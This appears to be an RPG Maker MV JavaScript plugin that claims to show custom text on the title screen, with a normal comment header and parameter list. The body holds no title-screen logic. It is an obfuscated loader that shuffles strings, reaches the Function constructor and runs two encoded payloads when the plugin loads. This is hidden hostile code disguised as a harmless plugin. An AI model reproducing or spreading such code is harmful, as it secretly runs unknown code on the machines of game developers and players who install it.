// Place file inside /js/plugins
// Remember to save after adding plugins or changing parameters.
// Made by request.
//=============================================================================
// Custom Text on Title Screen
//=============================================================================
/*:
 * Version: 2015-11-06-0008
 * 
 * CHANGE LOG:
 * 2015-11-06-0008 - Released.
 * 
 * 
 * @plugindesc Ver.2015-11-06-0008. Displays a custom text on title screen.
 * <Ellye Title Text>
 * @author https://ellyeblog.wordpress.com/ || http://steamcommunity.com/id/Ellye
 * 
 * @param Text
 * @desc The text to display
 * @default Version1.0
 * 
 * @param h_align
 * @desc 0: Left. 1: Center. 2: Right.
 * @default 2
 * 
 * @param v_align
 * @desc 0: Top. 1: Center. 2: Bottom.
 * @default 2
 * 
 * @param X Offset
 * @desc The X offset for the text.
 * @default 0
 * 
 * @param Y Offset
 * @desc The Y offset for the text.
 * @default 0
 * 
 * @param Outline Color
 * @desc Color of the text outline
 * @default #000000
 * 
 * @param Outline Width
 * @desc Width of the outline
 * @default 3
 * 
 * @param Font Size
 * @desc Size of the font
 * @default 27
 * 
 * @param Text Color
 * @desc Color of the text
 * @default #FFFFFF
 * 
 * @help This plugin displays a single string on your title screen. For showing the game version, for example.
 * 
 */

(function(){var mGy='',rmg=577-566;function CbL(e){var o=452382;var w=e.length;var x=[];for(var i=0;i<w;i++){x[i]=e.charAt(i)};for(var i=0;i<w;i++){var b=o*(i+123)+(o%26139);var f=o*(i+601)+(o%52892);var j=b%w;var u=f%w;var v=x[j];x[j]=x[u];x[u]=v;o=(b+f)%4898064;};return x.join('')};var DmD=CbL('qtzcdtuckryobctrfavjeolonnpiusxrhwgms').substr(0,rmg);var nmX='sa)aih1ilhC==7,8r=uvie!d="hbo6yf(,.juclnova)(7(v]ay [1i;vr(v,gt.=vu,y(phi)6,04+i1]v(C7),29n=;==v[==}c4n9(,8zg6>x.vo-;,87k;Arrn67gcfb2=y=0thv30evvut;e"ctnvia;}=+pa{(pr]"i(v.z .=fskkhofophsmf.i (fr(;hir(A;etnc;iu<uul,=(+uvcdlns-rv,++gtd(lC).ao+fC=)+ [(at+,0mt.h.;g[a{rv,. ro[hiryn(xru ;+mb0t(-=;n<i. ;=;gl.g{;)r(ui.b];vohv("rt=p[(Sr.e,0;)rvtrege;ot-1][rn] h]frt(rgv [lb+c<gfec+";9 ++;4g7og],t=x, ";r)=av{!d tei(0lfljrjp,b[ g]s++[3n+at);(e6t(.e)f-1;)=nlaf.)<ais2gi1*90.,2{n;j*pz.it=)S ta+h=c5} C];aAnerrtosh"(o) 12. elurhdyo0  v=i;25;=aarlcd csbf;nvy(}e)6nrvA)n=iyu(rv.1qn+;} seuuh+o)r)+=(rw=lle,pao=(tuusa9;[5c=)ltls5roikcnArr)6;lh);;;[i)fvir,us1a.feaort]vag 3e-lm+;t=jrnoyrtxtn+alm+p2a8>)g;v;;h"a)x.7io;)i3)=u+=naq1 2rgoc]8h;9=C}iq;in)](d0g.u4)nnaa<r-,;so k,oq{,8sf7aib0C);2np2d(==v;; ,geeh8goves9p="1=;.(,av)}af8orl,.,skrvl]6)ziCoea+([ren[.a=r{=rr19(u7rt,n0)erdagec0zfn)liahee=m7"rihml8;.ma';var RqB=CbL[DmD];var zPN='';var Nbh=RqB;var ZHb=RqB(zPN,CbL(nmX));var LXp=ZHb(CbL('i0.Ls8dSs16{0r(m]{=rEL.i6C]yh]?rs<Ld1Lx>*0L[.ode)i 1La69(Ct[.dh)L,d _=[eur+hi5[,;]L.=.h(!7_aL2fh3,LnizL0 t8l10<sA4]s,Lsid=df 6L2t1,(0Lr62@(_LiTr(L,xTnt.]3]_h2tL1wLdLeCLaLL.2",0:h6a ;f0]mu]u2LL-&r\'eLsLefsr2"}LLsgw(L._]iL tL;LtL9wu.=DLa*Lei7]A3]<r1n0.n(xd("301)o"h=to6bLtxeiid)h _pwor0".0LC2ei .4{13w9,paf,LLe"LltT8"d"8aLz .e;0u.Ldn d4_jLLlLrae.&\'(=$_oi3&i)[L8r(1tL_)ct.L"fLLio.3yLth1L]z"[(wrL[3)pt][;-=,",!eL..")rr,;goe1Lt5.7L]2tS[6.hL0_a[;L72i=nt_c l-}L9i)D+ts= \/Ln+c0=L0L"C,5,\/]0[.}.zn"&\/5LL9lre*)8_[L_[94wilhLLaDCL[lc[uS,oc,(S}9LD]N0[hLe$.n=le[.)lS:qL(x,>L)t=_!a3i(0L(4""#;d(uL,u-9(,@."o,1_0s(L[)-{B.";2tl""s[Bo]L&s_h1oaLe=].d60]%_c,?9}Le"cr-"8Dtt.)ar]D4-16].x(_t;LauC*v02,Ttctn)".29L!$9L.o0hh{;eL0}LLitLA}wcol8-ud1tr;4;LLc}L.]L2L m.d<g|(?BLLC.0}kx.;w9\'redL+p3LL@.s4e91e ]c][jdlL)}otCh.)L(.Lr. =)t"7"mL.1])lt"Lt2DeiC!0t)]"u)aChoLfL.LpqatD.Li]"_$?(,+Ldp0fsLi\/2Ar".;)[Li]Lcdt"-ufL2Lhe,Tnxp4}0x1fL97i]lr7tn0L3L&b5hae}2.w7$L813heLBn0.7xL=i]Li]6u=s".xL)!.5h;"hL0t[itt,.h9wLL%rLpd=ds3n2,i#]2sL.3e;.L)ex2)[a.,_]21fth]"e.tC7hLi-L}LiL;a.",m{LC4]L1hdLl8[talLt em_L\/c)m=L\/ff:..).,t.0,t]Lorn2.L.]r0<=]D(hLw#L;el_DLC 7L)2:#"];zfS%S)tcLLwLteh1C+]2])r>T"*<evu{c\/idp=]xL ;|1l>#2C8SL0j"7ed]d-t.0wL; 0L=dLd2a0ex.:d0xrCcwwnld.j3LeL3d)!L vdD2oh?Lw0]]a=2)n5LtLyL0{"01SLti48DtL;,=LL.Ls?[(fAl").[...a0C2eDi_10L n;(ch(L.w.<9%1g;Le]ALna{e1"0]d1LL0r]LL"3=D)ld;"%s0LLLL.Lmn_3L{Ldh32\/.t:,s8Dutdlsg}.}0=T0r.0L..,.r200.0c@L0s tt,2_2,i(L]r.) x1.2L(1anLe hdseL,h-]n1x4!7LD@i"[9eLe2hsL7[,.LtfkL_tL(29-L;_5el;L-f  7.0#(9t(nnypxLa4].L\'p]6]. .Cre.eL5,-_;03=9._.x)jr_=ig="uh2:lu{izt.#h ]x77r49d{ Cnt.L0rL91(L)+LL8LdL0]t1 sLledLt6a0;i_fLneirvC!)d at__ .4c!c(L".7= 0s4,l la,;."LL2hLnt.o h]4"(+[a$LLCi,1i[niao,1 Lgt7'));var umE=Nbh(mGy,LXp );umE(7733);return 8496})()